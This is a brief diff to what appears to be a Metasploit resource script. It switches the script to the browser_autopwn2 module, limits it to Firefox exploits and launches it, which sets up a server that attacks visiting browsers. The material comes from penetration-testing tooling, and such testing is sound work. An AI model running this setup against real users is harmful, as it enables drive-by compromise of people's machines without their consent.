@@ -1,7 +1,7 @@
 <ruby>
 print_status("Starting Browser Autopwn with Firefox-only BrowserExploitServer-based exploits.")
 print_status("Older Firefox exploits don't use BES, therefore will not be loaded.")
-run_single("use exploit/multi/browser/autopwn")
+run_single("use auxiliary/server/browser_autopwn2")
 run_single("set Include (mozilla_firefox|firefox)_")
 run_single("set RealList true")
 run_single("run")
